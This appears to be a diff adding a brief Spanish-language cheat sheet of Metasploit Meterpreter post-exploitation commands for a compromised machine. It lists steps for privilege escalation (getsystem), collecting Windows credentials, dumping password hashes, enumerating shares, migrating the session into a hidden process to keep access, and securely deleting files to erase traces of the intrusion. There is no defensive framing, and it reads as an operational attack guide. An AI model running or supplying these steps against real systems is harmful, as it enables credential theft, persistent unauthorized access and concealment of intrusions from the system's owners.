@@ -1,0 +1,30 @@
+#Obtener informacion del sistema Linux:
+
+$ run post/linux/gather/checkvm
+
+#Una tecnica bastante sencilla que esta dedicada a cuando comprometes una maquina "windows" 
+#que ya viene en "meterpreter" por defecto para escalar privilegios en "windows" es con el siguiente comando:
+
+$ getsystem
+
+#Recopilar credenciales Windows:
+
+$ run post/windows/gather/credentials/credential_collector
+
+#Enumerar las carpetas compartidas del sistema Windows:
+
+$ run post/windows/gather/enum_shares
+
+#Volcar hashes en Windows:
+
+$ run post/windows/gather/hashdump
+
+#Crear un nuevo proceso oculto, en este caso llamado "notepad.exe" y migra este "meterpreter" a dicho proceso, 
+#por lo que cuando se cierre el programa no le va a pasar nada a la conexion.
+
+$ run post/windows/manage/migrate
+
+#Para "Windows" podremos utilizar un modulo que viene en "metasploit" con el "meterpreter" que borra de 
+#forma segura todo lo que hayamos realizado en la intrusion, por lo que es mas comodo, ya que te lo hace todo el modulo.
+
+$ run post/windows/manage/sdel FILE=C:\\Users\\user\\Desktop\\<FILE>
